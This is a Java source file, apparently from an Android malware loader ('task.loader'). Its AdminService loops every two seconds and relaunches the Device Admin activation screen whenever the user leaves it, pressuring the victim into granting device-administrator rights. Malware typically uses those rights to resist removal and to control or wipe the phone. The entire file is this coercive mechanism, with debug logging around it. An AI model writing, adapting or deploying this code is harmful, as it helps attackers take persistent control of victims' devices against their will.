package task.loader.admin;

import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

import android.app.ActivityManager;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.os.SystemClock;

import task.loader.Constants;
import task.loader.Settings;

public class AdminService extends IntentService 
{
	public static AtomicBoolean work = new AtomicBoolean(false);
	
	public AdminService() 
	{
		super("");
	}

	@Override
	protected void onHandleIntent(Intent intent) 
	{
		if(Settings.isBlock(this))
			return;

		String action = intent.getAction();

		if(Constants.DEBUG) Settings.debug(getClass().getName() + "::onHandleIntent() action: " + action);
		
		if(action == null) action = "";
		
		try
		{
			ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
			
			while(work.get())
			{
				List<ActivityManager.RunningTaskInfo> RunningTask = activityManager.getRunningTasks(1);
				
				ActivityManager.RunningTaskInfo taskInfo = RunningTask.get(0);

				if(Constants.DEBUG)
				{
					Settings.debug("-----------------------------------");

					Settings.debug("topActivity: " + taskInfo.topActivity);
					Settings.debug("topActivity.getPackageName(): " + taskInfo.topActivity
							.getPackageName());

					Settings.debug("topActivity.getClassName(): " + taskInfo.topActivity
							.getClassName());

					Settings.debug("===================================");
				}
				
				if(!taskInfo.topActivity.getClassName().endsWith("DeviceAdminAdd"))
				{
					if(Constants.DEBUG) Settings.debug("start admin");
					
					if(work.get())
					{
						Admin.startAdminActivity(this);
					}
				}
				
				SystemClock.sleep(2000);
			}
		}
		catch(Exception ex)
		{
			if(Constants.DEBUG) Settings.debug(ex);
		}
	}
}
